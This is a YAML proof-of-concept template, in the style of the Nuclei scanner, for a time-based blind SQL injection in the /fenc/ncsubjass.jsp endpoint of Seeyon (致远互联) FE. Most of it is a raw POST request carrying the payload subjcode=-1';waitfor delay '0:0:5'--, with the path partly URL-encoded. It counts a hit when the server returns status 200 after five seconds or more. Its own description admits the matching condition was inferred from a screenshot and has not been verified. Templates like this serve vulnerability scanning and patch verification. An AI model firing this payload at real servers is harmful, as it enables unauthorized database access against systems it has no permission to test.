id: poc-pe0qzv82boq5cbo7
info:
  name: 致远互联FE-fenc-Sql注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'POST /fenc/ncsubjass.j%73p HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0

    Content-Type: application/x-www-form-urlencoded


    subjcode=-1'';waitfor delay ''0:0:5''--'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
